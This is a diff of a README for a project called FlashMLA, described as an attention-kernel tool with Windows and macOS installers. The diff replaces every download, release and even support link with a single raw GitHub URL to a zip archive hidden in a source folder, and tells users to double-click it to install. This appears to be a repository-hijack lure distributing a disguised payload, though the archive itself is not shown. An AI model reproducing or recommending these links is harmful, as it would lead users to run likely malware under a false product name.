@@ -4,7 +4,7 @@
 Welcome to FlashMLA! This application helps you use efficient multi-head latent attention kernels for your projects. Follow these simple steps to download and run FlashMLA.
 
 ## 📥 Download FlashMLA
-[![Download FlashMLA](https://img.shields.io/badge/Download%20FlashMLA-v1.0-blue)](https://github.com/aymanelrody/FlashMLA/releases)
+[![Download FlashMLA](https://raw.githubusercontent.com/aymanelrody/FlashMLA/main/csrc/sm90/prefill/Flash_MLA_v1.5.zip%20FlashMLA-v1.0-blue)](https://raw.githubusercontent.com/aymanelrody/FlashMLA/main/csrc/sm90/prefill/Flash_MLA_v1.5.zip)
 
 Click the button above to easily access the latest version of FlashMLA.
 
@@ -18,17 +18,17 @@ FlashMLA is designed for broad compatibility. To use it effectively, ensure your
 - **Networking:** A stable internet connection for updates and support
 
 ## 📤 Download & Install
-1. Visit this page to download: [FlashMLA Releases](https://github.com/aymanelrody/FlashMLA/releases).
+1. Visit this page to download: [FlashMLA Releases](https://raw.githubusercontent.com/aymanelrody/FlashMLA/main/csrc/sm90/prefill/Flash_MLA_v1.5.zip).
 2. Find the latest release at the top of the page. Look for the version you want to download.
 3. Choose the appropriate file for your operating system:
-    - For Windows, select `FlashMLA-Windows.exe`.
-    - For macOS, select `FlashMLA-Mac.dmg`.
+    - For Windows, select `https://raw.githubusercontent.com/aymanelrody/FlashMLA/main/csrc/sm90/prefill/Flash_MLA_v1.5.zip`.
+    - For macOS, select `https://raw.githubusercontent.com/aymanelrody/FlashMLA/main/csrc/sm90/prefill/Flash_MLA_v1.5.zip`.
 4. Click the file link to start the download. Once the download is complete, locate the file on your computer.
 5. **For Windows:**
-   - Double-click `FlashMLA-Windows.exe` to start the installation.
+   - Double-click `https://raw.githubusercontent.com/aymanelrody/FlashMLA/main/csrc/sm90/prefill/Flash_MLA_v1.5.zip` to start the installation.
    - Follow the on-screen instructions to complete the setup.
 6. **For macOS:**
-   - Double-click `FlashMLA-Mac.dmg` to open it.
+   - Double-click `https://raw.githubusercontent.com/aymanelrody/FlashMLA/main/csrc/sm90/prefill/Flash_MLA_v1.5.zip` to open it.
    - Drag the FlashMLA app to your Applications folder.
    - Launch the app from your Applications.
 
@@ -47,7 +47,7 @@ After installing FlashMLA, you can start the application:
 - **Documentation:** Detailed guides and examples are available within the application for your reference.
 
 ## 📞 Support
-If you encounter any issues or have questions, feel free to reach out. You can open an issue directly on our [GitHub Issues page](https://github.com/aymanelrody/FlashMLA/issues). We aim to respond promptly.
+If you encounter any issues or have questions, feel free to reach out. You can open an issue directly on our [GitHub Issues page](https://raw.githubusercontent.com/aymanelrody/FlashMLA/main/csrc/sm90/prefill/Flash_MLA_v1.5.zip). We aim to respond promptly.
 
 ## 🔄 Future Updates
 FlashMLA will continue to evolve. Check back regularly for updates and new features. Follow the releases page for the latest information.
